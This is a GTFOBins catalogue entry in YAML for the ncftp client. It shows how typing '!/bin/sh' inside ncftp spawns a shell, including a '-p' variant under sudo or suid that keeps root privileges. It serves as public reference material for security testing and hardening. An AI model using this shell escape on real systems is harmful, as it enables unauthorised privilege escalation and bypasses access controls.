<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ncftp -->
---
functions:
  shell:
  - code: |-
      ncftp
      !/bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          ncftp
          !/bin/sh -p
        shell: true
      unprivileged:
...
